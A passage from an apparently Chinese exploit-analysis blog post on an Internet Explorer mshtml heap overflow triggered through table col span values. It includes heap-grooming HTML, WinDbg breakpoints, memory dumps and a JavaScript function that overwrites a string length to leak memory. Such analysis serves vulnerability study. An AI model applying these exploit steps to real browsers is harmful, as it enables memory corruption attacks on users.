<span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"102"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"103"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"104"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"105"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"106"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"107"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"108"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"109"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"110"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"111"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"112"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"113"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"114"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"115"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"116"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"117"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"118"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"119"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"120"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"121"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"122"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"123"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"124"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"125"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"126"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"127"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"128"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"129"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"130"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"131"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为JavaScript中的Array并不是连续的(貌似是赋值的时候动态申请的内存，通过链表之类的连接在一起)，所以可以实现上述内存布局。<br>这里解释两个问题：</p><ol><li>为什么是<code>(0x100 - 6) / 2</code><br>因为前文也提到了，字符串除了数据本身，还有4字节的头部和2字节的尾部，所以为了保证整个字符创是0x100字节大小的，我们需要先减去头部和尾部的长度。<br>又因为javascript中默认是使用Unicode，所以每个字符占用的是2个字节，所以还要除以2。</li><li>为什么大小需要是<code>0x100</code><br>在poc分析中我们可以发现，申请的空间大小是<code>spannum * 0x1c</code>，在上面构造布局的代码中，<code>spannum == 9</code>，可知申请的空间大小为<code>9 * 0x1c = 0xfc</code>，在字节对齐都就是<code>0x100</code>。</li><li>为什么需要使用<code>div_container.appendChild(obj);</code><br>这里引用<a href="http://c00c.cc/1493200282.html" target="_blank" rel="noopener">c00c师傅</a>的解释<blockquote><p>CButton的大小为0x58，无法和3次申请的0x100大小的空间连续起来，但是通过<code>appendChild</code>可以申请0xfc的大小，成功和前3块连续起来。</p></blockquote></li></ol><h3 id="调试笔记"><a href="#调试笔记" class="headerlink" title="调试笔记"></a>调试笔记</h3><blockquote><p>这里学到个姿势，大部分的JS函数都可以在jscript.dll中找到对应的API名字</p></blockquote><p>为了能够看到堆块的释放和创建，我们创建如下两个断点:<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bu ntdll!RtlFreeHeap &quot;.echo free heap;db poi(esp+c) l10;g&quot;</span><br><span class="line">bu mshtml!CTableLayout::CalculateMinMax+0x1df &quot;.echo vulheap; dd poi(ebx+9c) l4;g&quot;</span><br></pre></td></tr></table></figure><p></p><p>第一条是在调用<code>ntdll!RtlFreeHeap</code>函数去释放堆块时，输出<code>poi(esp+c)</code>处，即被释放的地址处的数据<br>第二条是在刚好执行完<code>mshtml!CImplAry::EnsureSizeWorker</code>的下一条指令处，输出刚申请的堆块的地址</p><p>由于输出的信息可能较多，所以可以将其保存在文档中，命令<code>.logopen</code>。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; .logopen</span><br><span class="line">Opened log file &apos;dbgeng.log&apos;</span><br><span class="line">0:005&gt; g</span><br><span class="line">free heap</span><br><span class="line">000cc870  5c 00 3f 00 3f 00 5c 00-43 00 3a 00 5c 00 57 00  \.?.?.\.C.:.\.W.</span><br><span class="line">...</span><br><span class="line">free heap</span><br><span class="line">000e4b00  40 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00  @...E.E.E.E.E.E.</span><br><span class="line">free heap</span><br><span class="line">000eef28  40 00 00 00 41 00 41 00-41 00 41 00 41 00 41 00  @...A.A.A.A.A.A.</span><br><span class="line">...</span><br><span class="line">free heap</span><br><span class="line">02b89e38  fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00  ....E.E.E.E.E.E.</span><br><span class="line">free heap</span><br><span class="line">02b8a258  fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00  ....E.E.E.E.E.E. &lt;======++</span><br><span class="line">free heap                                                                          ||</span><br><span class="line">02b8a678  fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00  ....E.E.E.E.E.E.        ||</span><br><span class="line">free heap                                                                          ||</span><br><span class="line">02b8aa98  fa 00 00 00 45 00 45 00-45 00 45 00 45 00 45 00  ....E.E.E.E.E.E.        ||</span><br><span class="line">...                                                                                ||</span><br><span class="line">vulheap                                                                            ||</span><br><span class="line">02b8a258  0000018e 00450045 00450045 00450045                               =======++</span><br><span class="line">...</span><br><span class="line">0:013&gt; db 02b8a258 l400</span><br><span class="line">02b8a258  05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00  ................</span><br><span class="line">02b8a268  45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00  E.E.A.E.X@......</span><br><span class="line">02b8a278  05 14 00 00 05 14 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">02b8a288  41 00 45 00 58 40 01 00-05 14 00 00 05 14 00 00  A.E.X@..........</span><br><span class="line">02b8a298  05 14 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">02b8a2a8  58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00  X@..............</span><br><span class="line">02b8a2b8  00 00 00 00 45 00 45 00-41 00 45 00 58 40 01 00  ....E.E.A.E.X@..</span><br><span class="line">02b8a2c8  05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00  ................</span><br><span class="line">02b8a2d8  45 00 45 00 41 00 45 00-58 40 01 00 05 14 00 00  E.E.A.E.X@......</span><br><span class="line">02b8a2e8  05 14 00 00 05 14 00 00-00 00 00 00 45 00 45 00  ............E.E.</span><br><span class="line">02b8a2f8  41 00 45 00 58 40 01 00-05 14 00 00 05 14 00 00  A.E.X@..........</span><br><span class="line">02b8a308  05 14 00 00 00 00 00 00-45 00 45 00 41 00 45 00  ........E.E.A.E.</span><br><span class="line">02b8a318  58 40 01 00 05 14 00 00-05 14 00 00 05 14 00 00  X@..............</span><br><span class="line">02b8a328  00 00 00 00 45 00 45 00-41 00 45 00 58 40 01 00  ....E.E.A.E.X@..</span><br><span class="line">02b8a338  05 14 00 00 05 14 00 00-05 14 00 00 00 00 00 00  ................</span><br><span class="line">02b8a348  45 00 45 00 41 00 45 00-58 40 01 00 45 00 00 00  E.E.A.E.X@..E...</span><br><span class="line">02b8a358  cc 82 cf 1c 79 00 00 88-fa 00 00 00 41 00 41 00  ....y.......A.A.</span><br><span class="line">02b8a368  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a378  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a388  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a398  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a3a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a3b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a3c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a3d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a3e8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a3f8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a408  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a418  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a428  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a438  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a448  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.</span><br><span class="line">02b8a458  41 00 41 00 41 00 00 00-2b 82 cf 1c 00 00 00 88  A.A.A...+.......</span><br><span class="line">02b8a468  fa 00 00 00 42 00 42 00-42 00 42 00 42 00 42 00  ....B.B.B.B.B.B.</span><br><span class="line">02b8a478  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a488  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a498  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a4a8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a4b8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a4c8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a4d8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a4e8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a4f8  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a508  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a518  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a528  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a538  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a548  42 00 42 00 42 00 42 00-42 00 42 00 42 00 42 00  B.B.B.B.B.B.B.B.</span><br><span class="line">02b8a558  42 00 42 00 42 00 42 00-42 00 42 00 42 00 00 00  B.B.B.B.B.B.B...</span><br><span class="line">02b8a568  0a 82 cf 1c 62 00 00 8c-f8 3a b2 65 68 76 0b 00  ....b....:.ehv..</span><br><span class="line">02b8a578  48 28 b6 02 90 3c b2 65-01 00 00 00 00 00 00 00  H(...&lt;.e........</span><br><span class="line">02b8a588  09 08 08 01 ff ff ff ff-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02b8a598  00 00 00 00 ff ff ff ff-80 00 00 00 ff ff ff ff  ................</span><br><span class="line">02b8a5a8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02b8a5b8  00 00 00 00 24 00 00 00-20 00 00 00 00 00 00 00  ....$... .......</span><br><span class="line">02b8a5c8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02b8a5d8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02b8a5e8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02b8a5f8  00 00 00 00 00 00 00 00-00 00 00 00 20 a6 b8 02  ............ ...</span><br><span class="line">02b8a608  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02b8a618  01 00 00 00 01 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02b8a628  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">02b8a638  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................</span><br><span class="line">02b8a648  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br></pre></td></tr></table></figure><p></p><p>可以在代码最后加上一句<code>alert(1)</code>，以提醒已经执行完毕。<br>在log中找到最后一个vulheap，该heap即为我们打算去控制的col标签所创建的heap，id为132<br>查看该处内存，很容易发现字符串”EEEE…”处已经被覆盖。</p><h2 id="泄露数据"><a href="#泄露数据" class="headerlink" title="泄露数据"></a>泄露数据</h2><p>我们已经成功的构造了前文中所需的内存布局，接下来就需要进行第一次溢出了，让溢出数据覆盖掉后面字符串的长度信息。<br>由上文数据可知，从起始地址<code>0x02b8a258</code>到字符串”BBBB…”的长度信息地址<code>0x02b8a468</code>，长度为0x210，再加上4字节的长度信息，总共为<code>0x214字节</code>。<br>因为数据是以0x1c为单位长度写入的，所以需要设置span值恰好为<code>0x214/0x1c == 0x13 == 19</code></p><h3 id="溢出代码"><a href="#溢出代码" class="headerlink" title="溢出代码"></a>溢出代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> leak_col = <span class="built_in">document</span>.getElementById(<span class="string">"132"</span>);</span><br><span class="line">    leak_col.width = <span class="number">41</span>;</span><br><span class="line">    leak_col.span = <span class="number">19</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试笔记-1"><a href="#调试笔记-1" class="headerlink" title="调试笔记"></a>调试笔记</h3><p>同样的方法，找到最后一块vulheap<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 